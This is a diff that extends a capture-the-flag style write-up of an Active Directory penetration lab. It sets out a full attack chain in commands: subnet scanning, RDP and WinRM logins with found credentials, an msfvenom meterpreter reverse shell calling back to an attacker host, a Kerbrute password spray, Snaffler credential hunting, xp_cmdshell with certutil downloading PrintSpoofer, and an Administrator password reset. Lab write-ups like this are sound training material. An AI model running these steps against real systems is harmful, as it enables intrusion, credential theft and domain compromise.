@@ -31,21 +31,160 @@ Now i have this credential
 | ---------- | -------- | ------------ |
 | 172.16.7.3 | AB920    | weasal       |
 
------
+Using nmap i try to enumerate entire subnet
+```bash
+nmap -A 172.16.7.0/24 -Ao nmap_scan
+```
 
+I found three IP 
+```text
+172.16.7.3  DC01
+172.16.7.50 MS01
+172.16.7.60 SQL01
+```
+
+-----
 ## Foothold
 
-I need to view how can access in this client we the credential founded so i enumerate the open port of **172.16.7.3**
+I need to access in the `MS01` server (172.16.7.50). Enumerating more deep the 172.16.7.50 ip i found two method to try the foothold.
+1) The `3389` port is open this means we can try to access in the server with `RDP` protocol
 ```bash
-sudo nmap -sC -sV -oA nmap/nmap_scan 172.16.7.3
+export DISPLAY=:0
+ssh -X user@remote_host
+xfreerdp /u:AB920 /p:weasal /v:172.16.7.50 /dynamic-resolution
 ```
 
-![[Pasted image 20250517151754.png]]
-
-after scan i have the NetBIOS name `DC01` and the `389` port is open this means is possible to access with RDP protocol
-
-I have also discover a 5985 port open this meas the `winrm` is enable
+2) The `5985` port is open this means we can try to access in the server with `winrm` protocol
 ```bash
-sudo nmap -p 5985,5986 172.16.7.3
+crackmapexec winrm -u AB920 -p weasal -d INLANEFREIGHT 172.16.7.50
 ```
-![[Pasted image 20250517151931.png]]
+
+----
+## Password Spray Attack
+
+Download the `Kerbrute` and `PowerView.ps1` tools in the attack machine
+```bash
+wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe
+```
+
+Now i need to copy this tool in the machine where i have the SSH session.
+```bash
+scp PowerView.ps1 htb-student@10.129.73.75:/home/htb-student/Desktop
+scp kerbrute_windows_amd64.exe htb-student@10.129.73.75:/home/htb-student/Desktop
+```
+
+To transfer this tools in the `MS01` machine we can use the shared folder in the machine. To crate the shared folder on the victim machine use 
+```shell
+xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal /drive:share,/home/htb-student/Desktop
+```
+
+![[Pasted image 20250519000719.png]]
+
+I started the meterpreter shell to have more stable sessions on the compromise machine
+1) Create a meterpreter shell `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.7.240 LPORT=4466 -f exe > meterpreter_shell.exe`
+2) Use the `multi/handler` module
+3) Connect with RDP using `xfreerdp` and `/drive:share` flag
+4) Copy the .exe file on the desktop of victim machine
+5) Start the .exe file
+![[Pasted image 20250519001250.png]]
+
+Now using `PowerView` i need to crate a valid users list
+
+```powershell
+cd .\Desktop\
+Set-ExecutionPolicy Bypass -Scope Process
+Import-Module .\PowerView.ps1
+Get-DomainUser * | Select-Object -ExpandProperty samaccountname | Foreach {$_.TrimEnd()} |Set-Content adusers.txt
+Get-Content .\adusers.txt | select -First 10
+```
+
+![[Pasted image 20250519002018.png]]
+
+Using `kerbrute` i preform the passwordSpray attack with `Welcome1` stupid password
+
+```bash
+.\kerbrute_windows_amd64.exe passwordspray -d INLANEFREIGHT.LOCAL .\adUsers.txt Welcome1
+```
+
+![[Pasted image 20250519002429.png]]
+
+
+| User  | Password |
+| ----- | -------- |
+| BR086 | Welcome1 |
+
+---
+## Privilege Escalation
+
+First all i need to put the `Snaffler.exe` tool on the victim machine. I can use the same technique used with `Kerbrute`
+```shell
+wget -q https://github.com/SnaffCon/Snaffler/releases/download/1.0.16/Snaffler.exe
+
+scp Snaffler.exe htb-student@10.129.73.75:/home/htb-student/Desktop
+```
+
+![[Pasted image 20250519003745.png]]
+
+Now i try to run Snaffler as new user founded `BR086` i can achieve this with `runas` on powershell
+
+```powershell
+runas /netonly /user:INLANEFREIGHT\BR086 powershell
+```
+
+
+Now that i have impersonate the `BR086` can i launch the `snaffler` exe
+
+![[Pasted image 20250519012921.png]]
+
+
+| user  | password         |
+| ----- | ---------------- |
+| netdb | D@ta_bAse_adm1n! |
+
+With this credential is possible access to the `172.16.7.60` SQL server machine. In this case i used the `mssqlclient.py` tool
+```bash
+mssqlclient.py INLANEFREIGHT/netdb:D@ta_bAse_adm1n\!@172.16.7.60
+```
+
+using the `whomai /priv` command is possible to visualize all privilege. In this case we can **escalate privilege** trough **SeImpersonatePrivilage** with [PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe).
+![[Pasted image 20250519013904.png]]
+
+Firs alll download and copy on attack machine
+```bash
+wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
+
+scp PrintSpoofer64.exe htb-student@STMIP:/home/htb-student/Desktop
+
+```
+
+now activate the `python3 -m http.server` on the ssh attack machine and download on th `SQL01` machine with the following command
+```bash
+xp_cmdshell certutil -urlcache -split -f "http://172.16.7.240:9000/PrintSpoofer64.exe" c:\windows\temp\PrintSpoofer64.exe
+```
+
+![[Pasted image 20250519014508.png]]
+
+now i change the password for **Administrator** account in to `Welcome1`.
+
+```sql
+xp_cmdshell windows\temp\PrintSpoofer64.exe -c "net user administrator Welcome1"
+```
+
+![[Pasted image 20250519014658.png]]
+
+now using `smbclient` can i access as local user administrator and get the flag
+
+```bash
+smbclient -U administrator \\\\172.16.7.60\\C$
+```
+
+![[Pasted image 20250519015347.png]]
+
+or using `crackmapexec` with `--local-auth` flag
+
+```bash
+crackmapexec smb 172.16.7.60 -u administrator -p Welcome1 --local-auth --get-file 'Users\Administrator\Desktop\flag.txt' flag2.txt
+```
+
+![[Pasted image 20250519020119.png]]
+
